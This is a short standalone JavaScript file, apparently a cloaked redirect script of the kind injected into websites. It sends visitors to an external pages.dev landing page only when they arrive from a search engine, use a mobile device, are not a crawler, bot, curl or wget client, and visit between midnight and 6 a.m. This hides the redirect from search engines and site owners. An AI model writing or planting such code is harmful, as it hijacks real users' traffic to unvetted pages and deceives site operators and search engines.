const searchEngines = [
    'google.com', 'google.cn', 'baidu.com', 'bing.com', 'yahoo.com',
    'sogou.com', 'so.com', '360.cn'  ];

const botKeywords = [
    'bot', 'spider', 'crawler', 'slurp', 'curl', 'wget',
    'googlebot', 'bingbot', 'baiduspider', 'yandexbot'
];

const mobileKeywords = [
    'mobile', 'android', 'iphone', 'ipad', 'ipod', 'blackberry',
    'windows phone', 'iemobile'
];

const targetUrl = 'https://my-landing-page-9ru.pages.dev/';

function isInTimeWindow() {
    const now = new Date();
    const hour = now.getHours();  
    return hour >= 0 && hour <= 6;  
}

if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', checkAndRedirect);
} else {
    checkAndRedirect();  
}

function checkAndRedirect() {
    const referrer = document.referrer;
    if (!referrer || referrer.indexOf(window.location.hostname) !== -1) {
        return;  
    }

    const isFromSearchEngine = searchEngines.some(engine => referrer.includes(engine));
    if (!isFromSearchEngine) {
        return;      }

    const userAgent = navigator.userAgent.toLowerCase();
    
    const isBot = botKeywords.some(keyword => userAgent.includes(keyword));
    if (isBot) {
        return;  
    }
    
    const isMobile = mobileKeywords.some(keyword => userAgent.includes(keyword));
    if (!isMobile) {
        return;  
    }

    if (!isInTimeWindow()) {
        return;  
    }

    window.location.replace(targetUrl);
}




